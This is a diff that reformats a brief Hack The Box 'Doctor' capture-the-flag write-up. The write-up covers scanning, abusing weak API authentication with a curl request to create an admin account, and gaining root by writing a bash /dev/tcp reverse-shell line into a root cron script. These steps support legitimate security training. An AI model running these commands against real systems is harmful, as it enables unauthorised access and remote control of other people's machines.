@@ -1,42 +1,32 @@
-#Hack The Box: "Doctor" Writeup
-#Objective:
+# Hack The Box: "Doctor" Writeup
 
+## Objective:
 Exploit a vulnerable API and escalate privileges to root on a Linux machine.
 
-#Step 1: Nmap Scan
+## Step 1: Nmap Scan
+- Scanned the target to find open ports and services:
+    ```bash
+    nmap -A -T4 <target_ip>
+    ```
+- Discovered ports 80 (HTTP) and 8089 open, running a medical-related API.
 
--Scanned the target to find open ports and services:
+## Step 2: API Exploitation
+- Discovered that the API had weak authentication and could be abused to create users with elevated privileges.
+- Sent a crafted HTTP request using curl to create a new admin account:
+    ```bash
+    curl -X POST http://<target_ip>:8089/api/users -d '{"username": "admin", "password": "password", "role": "admin"}'
+    ```
+- Logged in using the newly created credentials and uploaded a reverse shell.
 
-    'bash
-    'nmap -A -T4 <target_ip>
+## Step 3: Privilege Escalation
+- After gaining initial access, used LinPEAS to find potential privilege escalation vectors.
+- Found a cron job running a script with root privileges.
+- Modified the cron job script to spawn a root shell:
+    ```bash
+    echo "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1" > /root/cronjob.sh
+    ```
+- Once the cron job executed, gained root access and retrieved the flag.
 
--Discovered ports 80 (HTTP) and 8089 open, running a medical-related API.
-
-#Step 2: API Exploitation
-
--Discovered that the API had weak authentication and could be abused to create users with elevated privileges.
-
--Sent a crafted HTTP request using curl to create a new admin account:
-
-    'bash
-    'curl -X POST http://<target_ip>:8089/api/users -d '{"username": "admin", "password": "password", "role": "admin"}'
-
--Logged in using the newly created credentials and uploaded a reverse shell.
-
-#Step 3: Privilege Escalation
-
--After gaining initial access, used LinPEAS to find potential privilege escalation vectors.
-
--Found a cron job running a script with root privileges.
-
--Modified the cron job script to spawn a root shell:
-
-    'bash
-    'echo "bash -i >& /dev/tcp/<your_ip>/<your_port> 0>&1" > /root/cronjob.sh
-
--Once the cron job executed, gained root access and retrieved the flag.
-
-#Lessons Learned:
-
--APIs often have weak or missing authentication mechanisms, which can be exploited for remote access.
--Cron jobs are a common method of privilege escalation in Linux systems, especially if they are misconfigured.
+## Lessons Learned:
+- APIs often have weak or missing authentication mechanisms, which can be exploited for remote access.
+- Cron jobs are a common method of privilege escalation in Linux systems, especially if they are misconfigured.
